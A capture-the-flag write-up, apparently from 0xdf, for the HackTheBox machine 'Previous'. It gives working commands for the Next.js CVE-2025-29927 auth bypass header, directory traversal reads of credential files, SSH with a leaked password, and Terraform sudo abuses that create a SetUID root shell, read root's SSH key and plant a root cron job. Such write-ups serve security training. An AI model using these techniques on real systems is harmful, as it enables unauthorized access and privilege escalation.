Previous starts with a NextJS application for a fictional JavaScript framework. I’ll exploit the infamous NextJS middleware vulnerability to access the authenticated portion of the site. From there, I’ll find a directory traversal vulnerability in a download API that allows reading files from the server, including the NextAuth config with hard-coded credentials. Those creds work for SSH, and I’ll pivot to root by abusing a misconfigured sudo rule that runs Terraform multiple ways.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH and nginx](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy LTS.

The webserver is redirecting to `previous.htb`. Given the use of virtual host routing, I’ll use `ffuf` to brute force any subdomains that respond differently, but not find any. I’ll add `previous.htb` to my `hosts` file.

```
10.10.11.83 previous.htb
```

All of the ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

### Website - TCP 80

#### Site

The site is for some kind of JavaScript framework named PreviousJS:

![image-20260105174414700](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105174414700.webp)

Clicking either the “Get Started” or “Docs” button leads to login page:

![image-20260105174446816](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105174446816.webp)

Trying to login silently fails.

#### Tech Stack

The HTTP response headers show that the site is running [NextJS](https://nextjs.org/):

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 05 Jan 2026 22:41:37 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Powered-By: Next.js
ETag: "6kopm5t1bh48k"
Vary: Accept-Encoding
Content-Length: 5493
```

The requests that follow are very typical for NextJS as well, loading a bunch of JavaScript from the `_next` directory:

![image-20260105175933242](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105175933242.webp)

The 404 page matches the [default NextJS 404](about:/cheatsheets/404#nextjs) page as well:

![image-20260105180228625](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105180228625.webp)

Wappalyzer shows this is Next.js 15.2.2:

![image-20260107122847881](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260107122847881.webp)

It gets this by looking around in all the Next.js JavaScript files. It’s not always in a consistent place, but for this case the only place I could find it is in `main-0221d9991a31a63c.js`:

```
oxdf@hacky$ curl -s "http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js" | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"'
"15.2.2"
```

#### NextJS Enumeration

NextJS is a hybrid framework. It doesn’t quite do traditional single page apps, but it has a lot of characteristics similar to SPAs. The root page has the `buildId` for the application at the bottom:

![image-20260105180712619](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105180712619.webp)

I’ll also note that `nextExport` and `autoExport` are both true, which means the app is statically exported. All the pages are pre-rendered as HTML/JS at build time. This means I should be able to see the routes in the manifest, which is requested from `/_next/static/-ipsiOtEey-zESpHzrwmc/_buildManifest.js`, using the build ID:

```
HTTP/1.1 200 OK

```

They all fall in `/docs` except for `/signin`, both of which I’ve seen already.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

### Auth Bypass

#### CVE-2025-29927

NIST describes [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) as:

> Next.js is a React framework for building full-stack web applications. Starting in version 1.11.4 and prior to versions 12.3.5, 13.5.9, 14.2.25, and 15.2.3, it is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware. If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the x-middleware-subrequest header from reaching your Next.js application. This vulnerability is fixed in 12.3.5, 13.5.9, 14.2.25, and 15.2.3.

The [bulletin on NextJS’s GitHub](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) rates this as critical, and offers the workaround:

> If patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.

Datadog has a [really nice writeup](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/) on the vulnerability. Basically, if the `x-middleware-subrequest` header is set in the HTTP headers, NextJS can be tricked into skipping the intended middleware (which is often used for authentication). In later versions of NextJS, a longer header is required, but it still works.

#### POC

I haven’t found a leak of the NextJS version yet, but this is such a quick POC it’s definitely worth a shot. If I fetch `/docs` normally (using a HEAD request with `-I` because I don’t need the body), it returns a 307 redirect to login:

```
oxdf@hacky$ curl -I -s "http://previous.htb/docs" 
HTTP/1.1 307 Temporary Redirect
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 05 Jan 2026 23:31:29 GMT
Connection: keep-alive
location: /api/auth/signin?callbackUrl=%2Fdocs
```

Adding the header “middleware” doesn’t bypass this:

```
oxdf@hacky$ curl -I -s "http://previous.htb/docs" -H "x-middleware-subrequest: middleware"
HTTP/1.1 307 Temporary Redirect
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 05 Jan 2026 23:32:23 GMT
Connection: keep-alive
location: /api/auth/signin?callbackUrl=%2Fdocs
```

This suggests it’s either patched or version 14 or earlier. Adding 5 “middleware”s (to max out the middleware `MAX_RECURSION_DEPTH`) does bypass the auth:

```
oxdf@hacky$ curl -I -s "http://previous.htb/docs" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 05 Jan 2026 23:32:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3353
Connection: keep-alive
X-Powered-By: Next.js
ETag: "83h4wb4nfw2l1"
Vary: Accept-Encoding
```

That’s exploitation of this CVE. I can use Burp proxy in intercept mode to catch the request and add the header to get the page to load in a browser as well:

![image-20260105183512105](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105183512105.webp)

#### Automating Add Header

To access the authenticated part of the site, I’ll need to add this header to basically every request. Rather than doing it manually, I’ll set up a “Match/replace rule” in Burp:

![image-20260105183807450](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105183807450.webp)

When the “Match” is blank, it just adds the “Replace” to the end. Now I can browse the site and it doesn’t redirect to the login page.

### Authenticated Site Enumeration

`/docs` shows a page (above) with references to two other pages. `/docs/getting-started` has some basic information, but nothing useful:

![image-20260105184009076](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105184009076.webp)

`/docs/examples` has a Hello World application as well as a link to download:

![image-20260105184037272](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105184037272.webp)

That link points at `/api/download?example=hello-world.ts`, and downloads `hello-world.ts`:

```ts
import { app } from 'previous';

const app = new App();
app.start();
```

### Directory Traversal / File Read

#### POC

I’ll send a copy of the modified GET request over to Burp Repeater (and clean out unneeded headers), and verify it works:

![image-20260105184542601](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105184542601.webp)

To test directory traversal, I’ll try to grab `/etc/passwd` using relative paths:

![image-20260105184634192](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105184634192.webp)

#### Enumeration

I’ll check out the current process:

![image-20260105185549693](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105185549693.webp)

The webserver runs out of `/app`. Some important files for NextJS:

- `.env` - Environment variables and secrets
- `package.json` - Dependencies and versions
- `.next/routes-manifest.json` - All application routes
- `.next/build-manifest.json` - Build metadata
- `next.config.js` or `next.config.mjs` - Next.js configuration

`.env` gives the secret key for the application:

![image-20260105185820033](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260105185820033.webp)

With this I can forge cookies. `package.json` confirms this is NextJS version 15.2.2:

```

It also shows that `next-auth` package is being used. [NextAuth.js](https://next-auth.js.org/) an open-source authentication package for [Next.js](http://nextjs.org/) applications. The NextAuth config is stored at `.next/server/pages/api/auth/[...nextauth].js`:

Throwing that into a JavaScript beautifier shows a hard-coded password:

```ts
authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {
    id: "1",
    name: "Jeremy"
} : null
```

### SSH

Those creds work for the jeremy user on Previous:

```
oxdf@hacky$ netexec ssh previous.htb -u jeremy -p MyNameIsJeremyAndILovePancakes
SSH         10.10.11.83     22     previous.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.10.11.83     22     previous.htb     [+] jeremy:MyNameIsJeremyAndILovePancakes  Linux - Shell access!
```

I’ll get a shell:

```
oxdf@hacky$ sshpass -p MyNameIsJeremyAndILovePancakes ssh jeremy@previous.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)
...[snip]...
jeremy@previous:~$
```

And `user.txt`:

```
jeremy@previous:~$ cat user.txt
dc81cd85************************
```

## Shell as root

### Enumeration

#### Users

There are no other users with home directories in `/home`, and jeremy and root are the only users with shells set:

```
jeremy@previous:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jeremy:x:1000:1000:,,,:/home/jeremy:/bin/bash
```

jeremy’s home directory has a couple interesting things:

```
jeremy@previous:~$ ls -la
total 36
drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4096 Sep 22 07:37 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
-rw-r----- 1 root   jeremy   33 Jan  6 01:52 user.txt
```

There’s a `docker` folder with the web application:

```
jeremy@previous:~$ ls docker/
docker-compose.yml  previous
jeremy@previous:~$ cat docker/docker-compose.yml 
services:
  next:
    build: previous
    restart: unless-stopped
    ports:
      - "127.0.0.1:3000:3000"
```

The `previous` directory has the `Dockerfile` and all the files for the web application, but they aren’t useful from this point.

There’s also a file related to [Terraform](https://www.terraform.io/), which is an infrastructure as code tool created by HashiCorp. jeremy can run a specific `terraform` command as root using `sudo`:

```
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

#### Terraform

This command forces the current working directory to be `/opt/examples` and then runs `apply`, which creates or updates infrastructure.

There’s a `.terraformrc` file in `/home/jeremy`:

```
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

`/opt/examples` has Terraform files:

```
jeremy@previous:~$ ls -a /opt/examples/
.  ..  .gitignore  main.tf  .terraform  .terraform.lock.hcl  terraform.tfstate
```

`main.tf` basically facilitates moving files from `/root/examples` to their home directory:

```
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

Putting this all together, when jeremy runs `sudo /usr/bin/terraform -chdir\=/opt/examples apply`:

- `sudo` runs `terraform` as root. The environment variables stay the same except for `$PATH`.
- Terraform reads the user config from `$HOME/.terraformrc`, which is still `/home/jeremy` because of `!env_reset`. This file provides the provider `previous.htb/terraform/examples` in `/usr/local/go/bin`.
- Terraform reads all the `.tf` files in `/opt/examples`, which in this case is `main.tf`. `main.tf` fill copy a file to the `destination_path`, which is hard coded into the binary provider.

The provider is a Go compiled ELF binary:

```
jeremy@previous:~$ file /usr/local/go/bin/terraform-provider-examples
/usr/local/go/bin/terraform-provider-examples: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=oxKqdB-oFvKp7KFdjH5q/X48Z8OR6LcD775Y3IE8l/gG1qKAHDEWR62hFKQOUM/p6l6Q8egzljUSxfkRz_z, with debug_info, not stripped
```

Go strings are not null terminated, so they often run together as one long string. The path `/home/jeremy/docker/previous/public/examples/` is in there:

```
jeremy@previous:~$ strings /usr/local/go/bin/terraform-provider-examples | grep home
        currently from:  %qcontext: internal error: missing cancel error/home/jeremy/docker/previous/public/examples/reflect: nil type passed to Type.AssignableToreflect: OverflowComplex of non-complex type reflect: internal error: invalid method indextransitioning GC to the same state as before?produced a trigger greater than the heap goaltried to run scavenger from another goroutineruntime: failed mSpanList.remove span.npages=exitsyscall: syscall frame is no longer validunsafe.String: ptr is nil and len is not zeroCalling provider defined planmodifier.Float32Calling provider defined planmodifier.Float64Calling provider defined planmodifier.DynamicInvalid Configuration for Read-Only AttributeInvalid Number Attribute Validator Value TypeInvalid Object Attribute Validator Value TypeInvalid String Attribute Validator Value TypeAttribute Validation Error Invalid Value TypeUnknown attribute value type (%T) at path: %sInvalid Object Block Plan Modifier Value Typeunknown attribute value type (%T) at path: %sCalling provider defined Provider DataSourcesCalling provider defined Resource ImportStateDataSource implements DataSourceWithConfigureCalling provider defined DataSource ConfigureCalled provider defined Resource UpgradeStatehttp: putIdleConn: connection is in bad statehttp: no Client.Transport or DefaultTransportinvalid request :path %q from URL.Opaque = %qhttp: multipart handled by ParseMultipartFormnet/http: internal error: connCount underflowcannot send after transport endpoint shutdownunhandled Int32 state in ToTerraformValue: %sunhandled Int64 state in ToTerraformValue: %smissing type information; cannot create valueObject Attribute Name (%s) Expected Type: %s
```

Actually running the command makes sure a copy of `hello-world.ts` exists in a directory in jeremy’s home directory:

```
jeremy@previous:~$ sudo terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│

╵

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

-rw-r--r-- 1 jeremy jeremy 69 Jan  6 20:57 docker/previous/public/examples/hello-world.ts
```

If I delete that file and re-run, it copies it (I’ll note the new copy is owned by root):

```
jeremy@previous:~$ rm docker/previous/public/examples/hello-world.ts
jeremy@previous:~$ sudo terraform -chdir\=/opt/examples apply

Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following
symbols:
  + create

Terraform will perform the following actions:

  # examples_example.example will be created
  + resource "examples_example" "example" {
      + destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
      + id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
      + source_path      = "/root/examples/hello-world.ts"
    }

Plan: 1 to add, 0 to change, 0 to destroy.

Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

### Abuse Terraform

#### Overview

I’ll show three ways to abuse this `sudo` rule with `terraform` to get the flag / root:

```

linkStyle 0,4,5,6 stroke-width:2px,stroke:#FFFF99,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;
```

#### Malicious Config

When the `terraform` runs with `!env_reset` leaving the `$HOME`, that means it loads `/home/jeremy/.terraformrc`. That is the file that specifies where to get the binary to run:

```
jeremy@previous:~$ cat .terraformrc 
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

As jeremy, I have full control over that file:

```
jeremy@previous:~$ ls -l .terraformrc 
-rw-rw-r-- 1 jeremy jeremy 150 Aug 21 18:48 .terraformrc
```

This config has `terraform` run `/usr/local/go/bin/terraform-provider-examples`. I’ll change it to point somewhere I can control:

```
jeremy@previous:~$ cat .terraformrc
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/dev/shm"
        }
        direct {}
}
```

Now I’ll drop a script and make it executable:

```
jeremy@previous:~$ vim /dev/shm/terraform-provider-examples
jeremy@previous:~$ cat /dev/shm/terraform-provider-examples 
#!/bin/bash

cp /bin/bash /var/tmp/0xdf
chown root:root /var/tmp/0xdf
chmod 6777 /var/tmp/0xdf
jeremy@previous:~$ chmod +x /dev/shm/terraform-provider-examples
```

This will make a copy of `bash` named `0xdf` owned by root with SetUID and SetGID. Now I run `terraform`:

```
jeremy@previous:~$ sudo terraform -chdir\=/opt/examples apply
...[snip]...
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /dev/shm
...[snip]...
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider
│ previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized
│ remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,

│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
╵
```

It seems to error out, but the new copy of `bash` is there:

```
jeremy@previous:~$ ls -l /var/tmp/0xdf 
-rwsrwsrwx 1 root root 1396520 Jan  6 20:54 /var/tmp/0xdf
```

I’ll get a shell (with `-p` to not drop privs):

```
jeremy@previous:~$ /var/tmp/0xdf -p
0xdf-5.1#
```

And the flag:

```
0xdf-5.1# cat /root/root.txt
6e570fae************************
```

#### Overwrite Variables for Read

In the Terraform config, the source variable is set up with a `default` parameter:

```
variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"
```

That is used when no other is given, but I can pass it in using environment variables, which are preserved in this `sudo` configuration. I can try to directly read the flag, but the validation still holds:

```
jeremy@previous:~$ TF_VAR_source_path=/root/root.txt sudo terraform -chdir\=/opt/examples apply
...[snip]...
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
...[snip]...
╵
╷
│ Error: Invalid value for variable
│ 
│   on main.tf line 9:
│    9: variable "source_path" {
│     ├────────────────
│     │ var.source_path is "/root/root.txt"
│ 
│ The source_path must contain '/root/examples/'.
│ 
│ This was checked by the validation rule at main.tf:13,3-13.
```

Still, I can create a symbolic link:

```
jeremy@previous:~$ mkdir -p /dev/shm/root/examples                  
jeremy@previous:~$ ln -s /root/root.txt /dev/shm/root/examples/flag
jeremy@previous:~$ ls -l /dev/shm/root/examples/
total 0
lrwxrwxrwx 1 jeremy jeremy 14 Jan  6 22:43 flag -> /root/root.txt
```

Now `terraform` fetches the flag:

```
jeremy@previous:~$ TF_VAR_source_path=/dev/shm/root/examples/flag sudo terraform -chdir\=/opt/examples apply
...[snip]...
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
...[snip]...
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following
symbols:
-/+ destroy and then create replacement

Terraform will perform the following actions:

  # examples_example.example must be replaced
-/+ resource "examples_example" "example" {
      ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/flag" # forces replacement
      ~ id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/flag"
      ~ source_path      = "/root/examples/hello-world.ts" -> "/dev/shm/root/examples/flag" # forces replacement
    }

Plan: 1 to add, 0 to change, 1 to destroy.

Changes to Outputs:
  ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/flag"

Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes

Apply complete! Resources: 1 added, 0 changed, 1 destroyed.

Outputs:

jeremy@previous:~$ cat /home/jeremy/docker/previous/public/examples/flag
6e570fae5d33565719d9a97fd0bb230f
```

I can use the same steps to read root’s SSH key:

```
jeremy@previous:~$ ln -sf /root/.ssh/id_rsa /dev/shm/root/examples/id_rsa
jeremy@previous:~$ TF_VAR_source_path=/dev/shm/root/examples/id_rsa sudo terraform -chdir\=/opt/examples apply

Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following

Terraform will perform the following actions:

      ~ id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/id_rsa"
      ~ source_path      = "/root/examples/hello-world.ts" -> "/dev/shm/root/examples/id_rsa" # forces replacement
    }

Plan: 1 to add, 0 to change, 1 to destroy.

Changes to Outputs:
  ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/id_rsa"

jR+NWPfpk9KHMAAAANcm9vdEBwcmV2aW91cwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

I can use that to get a shell as root:

```
oxdf@hacky$ ssh -i ~/keys/previous-root root@previous.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)
...[snip]...
root@previous:~#
```

#### Overwrite Variables for Write

I can also write anywhere because I can put a link in the target directory:

```
jeremy@previous:~$ ln -sf /etc/cron.d/pwn docker/previous/public/examples/pwn
jeremy@previous:~$ ls -l docker/previous/public/examples/
total 4
-rw-r--r-- 1 jeremy jeremy 69 Jan  6 22:59 hello-world.ts
lrwxrwxrwx 1 jeremy jeremy 15 Jan  6 22:59 pwn -> /etc/cron.d/pwn
```

Now I create a file to copy:

```
jeremy@previous:~$ echo "* * * * * root touch /tmp/rootcron"  > /dev/shm/root/examples/pwn
```

When I run now, it copies my cron to the `/etc/cron.d` directory:

```
jeremy@previous:~$ TF_VAR_source_path=/dev/shm/root/examples/pwn sudo terraform -chdir\=/opt/examples apply
...[snip]...
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
...[snip]...
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following
symbols:
-/+ destroy and then create replacement

Terraform will perform the following actions:

  # examples_example.example must be replaced
-/+ resource "examples_example" "example" {
      ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/pwn" # forces replacement
      ~ id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/pwn"
      ~ source_path      = "/root/examples/hello-world.ts" -> "/dev/shm/root/examples/pwn" # forces replacement
    }

Plan: 1 to add, 0 to change, 1 to destroy.

Changes to Outputs:
  ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/pwn"

Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes

examples_example.example: Destroying... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]
examples_example.example: Destruction complete after 0s
examples_example.example: Creating...
examples_example.example: Creation complete after 0s [id=/home/jeremy/docker/previous/public/examples/pwn]

Apply complete! Resources: 1 added, 0 changed, 1 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/pwn"
```

And it worked:

```
jeremy@previous:~$ ls /etc/cron.d
e2scrub_all  pwn
```

And that runs, touching a file:

```
jeremy@previous:~$ ls -l /tmp/rootcron 
-rw-r--r-- 1 root root 0 Jan  6 23:02 /tmp/rootcron
```

I could have that cron do more interesting things, like a reverse shell, or create a SetUID `bash`.
